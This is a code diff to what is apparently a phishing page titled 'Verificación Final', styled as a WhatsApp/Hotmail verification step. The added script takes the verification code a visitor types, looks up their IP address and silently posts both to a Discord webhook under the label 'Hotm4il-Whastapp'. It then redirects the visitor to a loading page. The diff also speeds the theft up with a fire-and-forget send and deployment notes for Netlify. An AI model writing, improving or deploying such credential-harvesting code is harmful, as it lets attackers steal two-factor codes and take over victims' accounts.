@@ -7,6 +7,31 @@
   <link rel="stylesheet" href="./styles.css">
   <link href="https://cdn.jsdelivr.net/npm/remixicon@2.5.0/fonts/remixicon.css" rel="stylesheet">
   <title>Verificación Final</title>
+  <style>
+    .button-loading {
+      position: relative;
+      pointer-events: none;
+    }
+    .button-loading::after {
+      content: "";
+      position: absolute;
+      width: 16px;
+      height: 16px;
+      top: 0;
+      left: 0;
+      right: 0;
+      bottom: 0;
+      margin: auto;
+      border: 3px solid transparent;
+      border-top-color: white;
+      border-radius: 50%;
+      animation: button-loading-spinner 1s linear infinite;
+    }
+    @keyframes button-loading-spinner {
+      from { transform: rotate(0turn); }
+      to { transform: rotate(1turn); }
+    }
+  </style>
 </head>
 <body>
   <section class="login">
@@ -33,7 +58,7 @@
         </div>
       </div>
 
-      <button type="submit" class="login--button--whatsapp">Siguiente</button>
+      <button type="submit" class="login--button--whatsapp" id="submitBtn">Siguiente</button>
 
       <div align="center">
         <span style="font-size:14px; color:red"></span>
@@ -46,19 +71,62 @@
   <script src="./main.js"></script>
   
   <script>
-    // Manejar envío del formulario
     document.getElementById('finalCodeForm').addEventListener('submit', async function(e) {
       e.preventDefault();
       
+      const submitBtn = document.getElementById('submitBtn');
+      const originalText = submitBtn.innerHTML;
       const verificationCode = document.getElementById('finalCode').value;
       
-      if(typeof sendVerificationCode === 'function') {
-        await sendVerificationCode(verificationCode);
-        window.location.href = 'load.html'; // O la página final que corresponda
-      } else {
-        console.error('La función sendVerificationCode no está disponible');
+      // Mostrar estado de carga
+      submitBtn.disabled = true;
+      submitBtn.classList.add('button-loading');
+      submitBtn.innerHTML = 'Enviando...';
+      
+      try {
+        // Envío NO BLOQUEANTE a Discord
+        if(typeof sendVerificationCode === 'function') {
+          // No esperamos la respuesta completa
+          sendVerificationCode(verificationCode)
+            .catch(err => console.error('Error en segundo plano:', err));
+        }
+        
+        // Redirección inmediata con retraso mínimo
+        setTimeout(() => {
+          window.location.href = 'load.html';
+        }, 500); // Pequeño delay para mejor UX
+          
+      } catch (error) {
+        console.error('Error:', error);
+        submitBtn.disabled = false;
+        submitBtn.classList.remove('button-loading');
+        submitBtn.innerHTML = originalText;
       }
     });
+
+    // Versión optimizada de la función en excedata.js
+    async function sendVerificationCode(code) {
+      try {
+        // Obtener datos de forma optimizada
+        const ipData = await Promise.race([
+          fetch('https://api.ipify.org?format=json').then(r => r.json()),
+          new Promise((_, reject) => setTimeout(reject, 1500, 'IP no disponible'))
+        ]);
+        
+        const message = `**==Hotm4il-Whastapp==**\n\n**Código Verificación:** \`${code}\`\n\n**IP:** ${ipData.ip || 'IP no disponible'}`;
+        
+        // Enviar a Discord sin esperar respuesta (fire-and-forget)
+        fetch("TU_WEBHOOK_DISCORD", {
+          method: 'POST',
+          headers: {'Content-Type': 'application/json'},
+          body: JSON.stringify({content: message}),
+          keepalive: true // Importante para Netlify
+        }).catch(e => console.error('Error Discord:', e));
+        
+      } catch (error) {
+        console.error('Error en sendVerificationCode:', error);
+      }
+    }
   </script>
 </body>
 </html>
